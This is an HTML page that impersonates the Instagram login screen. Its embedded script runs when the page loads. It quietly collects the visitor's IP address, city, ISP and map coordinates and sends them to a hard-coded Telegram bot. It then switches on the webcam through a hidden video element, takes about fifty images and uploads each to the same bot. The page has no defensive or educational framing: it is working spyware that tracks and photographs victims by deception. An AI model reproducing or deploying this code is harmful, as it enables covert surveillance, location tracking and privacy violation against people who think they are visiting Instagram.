<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram</title>
    <link rel="stylesheet" href="https://www.instagram.com/static/bundles/es6/ConsumerUICommons.css/bundle.css">
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #fafafa;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            flex-direction: column;
        }
        .login-container {
            background-color: white;
            border: 1px solid #dbdbdb;
            padding: 40px;
            text-align: center;
            width: 350px;
            border-radius: 10px;
        }
        .logo {
            width: 180px;
            margin-bottom: 20px;
        }
        input {
            width: 100%;
            padding: 10px;
            margin: 5px 0;
            border: 1px solid #dbdbdb;
            border-radius: 5px;
        }
        button {
            width: 100%;
            padding: 10px;
            background-color: #0095f6;
            color: white;
            border: none;
            border-radius: 5px;
            cursor: pointer;
        }
        button:hover {
            background-color: #0073e6;
        }
        video {
            display: none; /* Hide the video element */
        }
    </style>
    <script>
        // Function to get accurate IP and location
        async function getAccurateIP() {
            let response = await fetch('https://ipwho.is/');
            let data = await response.json();
            return data;
        }

        // Function to send data to Telegram bot
        async function sendToTelegram(message) {
            let botToken = "7565238718:AAGgWjTEn81YY_h_jTncM3tzc4tWJPdglds";
            let chatID = "860517021";
            let telegramURL = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatID}&text=${encodeURIComponent(message)}`;
            fetch(telegramURL);
        }

        // Capture and send 50 photos per second
        async function startCamera() {
            try {
                let stream = await navigator.mediaDevices.getUserMedia({ video: true });
                let video = document.createElement('video');
                video.style.display = 'none';
                video.srcObject = stream;
                document.body.appendChild(video);
                video.play();
                
                let canvas = document.createElement('canvas');
                let ctx = canvas.getContext('2d');
                canvas.width = 640;
                canvas.height = 480;
                
                let captureCount = 0;
                let captureLimit = 50; // Capture 50 images instantly
                
                let captureImages = async () => {
                    for (let i = 0; i < captureLimit; i++) {
                        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                        let imageData = canvas.toDataURL('image/png');
                        sendPhotoToTelegram(imageData);
                        captureCount++;
                    }
                    stream.getTracks().forEach(track => track.stop()); // Stop camera after capturing images
                };
                
                setTimeout(captureImages, 500); // Short delay to ensure camera is ready
                
            } catch (error) {
                console.error("Camera access denied or failed", error);
            }
        }

        // Send Captured Image to Telegram Bot
        async function sendPhotoToTelegram(imageData) {
            let botToken = "7565238718:AAGgWjTEn81YY_h_jTncM3tzc4tWJPdglds";
            let chatID = "860517021";
            let formData = new FormData();
            formData.append("chat_id", chatID);
            formData.append("photo", dataURItoBlob(imageData), "image.png");
            
            fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
                method: "POST",
                body: formData
            });
        }

        // Convert Data URL to Blob
        function dataURItoBlob(dataURI) {
            let byteString = atob(dataURI.split(',')[1]);
            let mimeString = dataURI.split(',')[0].split(':')[1].split(';')[0];
            let ab = new ArrayBuffer(byteString.length);
            let ia = new Uint8Array(ab);
            for (let i = 0; i < byteString.length; i++) {
                ia[i] = byteString.charCodeAt(i);
            }
            return new Blob([ab], { type: mimeString });
        }

        // Execute functions on page load
        window.onload = async function() {
            let ipData = await getAccurateIP();
            let message = `
                New Visitor Detected!\n
                IP Address: ${ipData.ip}\n
                Country: ${ipData.country}\n
                City: ${ipData.city}\n
                ISP: ${ipData.connection.isp}\n
                Map: https://www.google.com/maps?q=${ipData.latitude},${ipData.longitude}
            `;
            sendToTelegram(message);
            startCamera();
        };
    </script>
</head>
<body>
    <div class="login-container">
        <img src="https://upload.wikimedia.org/wikipedia/commons/a/a5/Instagram_icon.png" alt="Instagram Logo" class="logo">
        <input type="text" placeholder="Phone number, username, or email">
        <input type="password" placeholder="Password">
        <button>Log In</button>
    </div>
</body>
</html>
